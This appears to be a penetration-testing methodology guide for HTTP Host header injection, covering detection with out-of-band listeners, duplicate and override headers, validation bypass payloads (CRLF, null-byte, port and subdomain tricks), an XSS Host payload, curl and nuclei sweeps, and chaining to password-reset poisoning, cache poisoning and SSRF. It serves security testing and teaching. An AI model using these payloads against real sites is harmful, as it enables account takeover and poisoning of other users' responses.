# 🌐 Host Header Injection Methodology

> **A complete, structured approach to finding and exploiting Host header attacks — from detection to real-world impact.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-Host%20Header%20Injection-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-Routing%20%7C%20Cache%20%7C%20Email%20Links-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp%20%2B%20OOB-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction](#-introduction)
2. [Where to Find](#-where-to-find)
3. [Phase 1 — Detection Setup (OOB Listener)](#-phase-1--detection-setup-oob-listener)
4. [Phase 2 — Basic Host Header Manipulation](#-phase-2--basic-host-header-manipulation)
5. [Phase 3 — Header Duplication & Line Wrapping](#-phase-3--header-duplication--line-wrapping)
6. [Phase 4 — Host Override Headers](#-phase-4--host-override-headers)
7. [Phase 5 — Absolute URL / Request Line Injection](#-phase-5--absolute-url--request-line-injection)
8. [Phase 6 — Filter & Validation Bypass Tricks](#-phase-6--filter--validation-bypass-tricks)
9. [Phase 7 — Impact Scenarios to Chase](#-phase-7--impact-scenarios-to-chase)
10. [Phase 8 — Automated Scanning](#-phase-8--automated-scanning)
11. [Summary Workflow](#️-summary-workflow)
12. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction

HTTP Host header attacks exploit applications that handle the `Host` header in an unsafe way. If the server implicitly trusts this client-controlled value and fails to validate or escape it, an attacker can inject a payload that manipulates server-side behavior — from poisoning password-reset links to full routing-layer SSRF, depending on how deeply the value is trusted.

---

## 🔍 Where to Find

```
- Any feature that sends the user an email containing a link built
  from the Host header: forgot password, email verification, invite
  links, newsletter unsubscribe links
- Any feature that generates absolute URLs server-side (canonical
  links, Open Graph tags, sitemap generation, redirect logic)
- Multi-tenant / virtual-hosted applications where Host selects which
  backend or config gets served
- Applications sitting behind a reverse proxy / load balancer / CDN
  that forwards the original Host or trusts forwarding headers
- Cache layers (CDN, reverse proxy cache) that key on Host but the
  origin doesn't validate it consistently
```

---

## 🎧 Phase 1 — Detection Setup (OOB Listener)

Most Host header findings only prove themselves when a server-generated link or outbound request actually reaches attacker-controlled infrastructure.

```
1. Set up an out-of-band listener: ngrok (http/https tunnel) or
   Burp Collaborator
2. Trigger the target feature (password reset, email verification,
   webhook registration, etc.) while your poisoned Host header is
   in the request
3. Watch your listener for an inbound request/DNS lookup, or check
   your inbox for a link containing your listener's domain
```

```bash
# Quick ngrok listener setup
ngrok http 80
# use the generated *.ngrok.io / *.ngrok-free.app domain as your
# injected Host value in the tests below
```

---

## 🎯 Phase 2 — Basic Host Header Manipulation

```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```

> Confirm whether the app reflects this value anywhere immediately visible — canonical URL, redirect Location header, password-reset link, cache key — before moving to more advanced bypasses.

---

## 🧬 Phase 3 — Header Duplication & Line Wrapping

### Duplicate Host Header

Some parsers use the first `Host`, others use the last — inconsistency between the front-end (cache/proxy) and back-end app is exactly what enables cache poisoning:

```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```

### Line Wrapping / Header Folding

Obsolete HTTP header-folding syntax can smuggle a second Host value past a front-end that only inspects the first line:

```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```

---

## 🔀 Phase 4 — Host Override Headers

Even when the literal `Host` header is validated, many apps read from a secondary "trusted forwarding" header instead — check every variant:

```
X-Forwarded-Host: evil-website.com
X-Forwarded-For: evil-website.com
X-Client-IP: evil-website.com
X-Remote-IP: evil-website.com
X-Remote-Addr: evil-website.com
X-Host: evil-website.com
X-Forwarded-Server: evil-website.com
X-HTTP-Host-Override: evil-website.com
Forwarded: host=evil-website.com
```

Usage — keep the real `Host` valid, inject via the override header:

```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil-website.com
...
```

---

## 📐 Phase 5 — Absolute URL / Request Line Injection

Instead of touching the `Host` header at all, some proxies/servers honor an absolute URL on the request line over the header:

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```

---

## 🛡️ Phase 6 — Filter & Validation Bypass Tricks

When a naive allow-list/regex check is in place, try these against it:

```
# Port injection — some validators only check the hostname portion
# but the app still uses the full value including a smuggled port
Host: vulnerable-website.com:evil-website.com
Host: vulnerable-website.com:@evil-website.com
Host: vulnerable-website.com#@evil-website.com
Host: vulnerable-website.com%2523evil-website.com

# Subdomain-prefix trick — passes a regex/substring check for the
# real domain while actually resolving to attacker infra
Host: vulnerable-website.com.evil-website.com

# Subdomain-suffix trick — same idea, reversed
Host: evil-website.com.vulnerable-website.com

# Null byte / trailing garbage some parsers truncate differently
# than the validation layer
Host: vulnerable-website.com%00.evil-website.com
Host: vulnerable-website.com\r\nX-Injected: evil-website.com

# Case variation against case-sensitive allow-lists
Host: VULNERABLE-WEBSITE.COM.evil-website.com

# IP address instead of hostname — checks if server even validates
# format vs just presence
Host: 127.0.0.1
Host: 0.0.0.0
Host: [::1]
```

---

## 💥 Phase 7 — Impact Scenarios to Chase

A confirmed Host header reflection is only step one — chase it to actual impact:

| Scenario | How to Confirm |
|---|---|
| **Password reset poisoning → ATO** | Poison the Host, trigger a password reset, check if the emailed link points to your domain — see `Password-Reset-Testing.md` Phase 3 for the full chain |
| **Web cache poisoning** | Poison the Host on a cacheable page, then request the same page unauthenticated/from a different session — if your poisoned response is served back, the cache is poisoned for every visitor |
| **Web cache deception (reverse)** | Request a sensitive authenticated page with a manipulated path/extension so it gets cached publicly, then fetch it unauthenticated |
| **SSRF via routing confusion** | In virtual-hosted/microservice setups, an unexpected Host value can route the request to an internal-only backend service not meant to be externally reachable |
| **Business logic bypass** | Some apps key feature flags, pricing, or region/locale off the Host header — a poisoned Host can unlock hidden environments (staging, admin subdomains reachable via routing) |
| **XSS via reflected Host** | If the Host value is reflected unescaped into HTML (e.g. in a canonical link or error page), test a payload Host: `"><script>alert(1)</script>` |
| **Open redirect** | If Host is used to build a redirect Location header, a poisoned Host becomes an open redirect to attacker infra |

---

## 🤖 Phase 8 — Automated Scanning

🛠️ Tools: [Nuclei](https://github.com/projectdiscovery/nuclei), [httpx](https://github.com/projectdiscovery/httpx), Burp's built-in Host header scan (Pro)

```bash
# Nuclei — dedicated host-header-injection templates
nuclei -u https://target.com -t http/vulnerabilities/generic/host-header-injection.yaml

# Quick manual sweep across override headers with curl
for header in "X-Forwarded-Host" "X-Forwarded-For" "X-Client-IP" "X-Remote-IP" "X-Remote-Addr" "X-Host"; do
  echo "[*] Testing $header"
  curl -s -H "$header: evil-website.com" https://target.com/ -o /dev/null -w "%{http_code}\n"
done

# httpx to sanity-check how the app responds to a raw Host swap at scale
echo "target.com" | httpx -H "Host: evil-website.com" -silent -sc -location
```

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│           HOST HEADER INJECTION WORKFLOW               │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🎧 Stand Up an OOB Listener (ngrok/Collaborator)  │
│            ↓                                          │
│  2. 🎯 Basic Host Override → Check for Reflection     │
│            ↓                                          │
│  3. 🧬 Try Duplicate Header / Line Wrapping           │
│            ↓                                          │
│  4. 🔀 Try Every X-Forwarded-* / Override Header      │
│            ↓                                          │
│  5. 📐 Try Absolute-URL Request Line Injection        │
│            ↓                                          │
│  6. 🛡️ If Filtered → Port/Prefix/Suffix Bypass Tricks │
│            ↓                                          │
│  7. 💥 Chase Real Impact (reset link, cache, SSRF,    │
│         XSS, open redirect, business logic)           │
│            ↓                                          │
│  8. 🤖 Automate a Sweep with Nuclei/httpx for Scale   │
│            ↓                                          │
│  9. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Host value reflected anywhere in the response/email/redirect?
    ├── YES (direct Host works) → chase impact directly (Phase 7)
    │
    ├── NO → try override headers one by one (Phase 4)
    │         X-Forwarded-Host is the highest-hit-rate one to try first
    │
    ├── Still nothing? → try duplicate Host / line wrapping (Phase 3)
    │                     → try absolute-URL request line (Phase 5)
    │
    └── Reflected but validated/filtered? → bypass tricks (Phase 6):
            - port injection
            - subdomain prefix/suffix trick
            - null byte / CRLF truncation mismatch
            - case variation

Reflection confirmed?
    ├── Appears in an emailed link? → password reset poisoning (Phase 7)
    ├── Page is cacheable? → cache poisoning (Phase 7)
    ├── Reflected unescaped in HTML? → XSS (Phase 7)
    ├── Used to build a redirect? → open redirect (Phase 7)
    └── Multi-tenant/virtual-hosted backend? → routing-based SSRF (Phase 7)
```

---

### 📚 Resources

- 🔗 [PortSwigger — HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- 🔗 [PortSwigger — Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
- 🔗 [PortSwigger — Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- 🔗 [Nuclei Templates — Host Header Injection](https://github.com/projectdiscovery/nuclei-templates)
- Companion docs: `Password-Reset-Testing.md`, `API-Testing-Methodology.md`, `recon.md`

---

<div align="center">

### 🔥 Poison the header. Chase the link. Confirm the impact.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
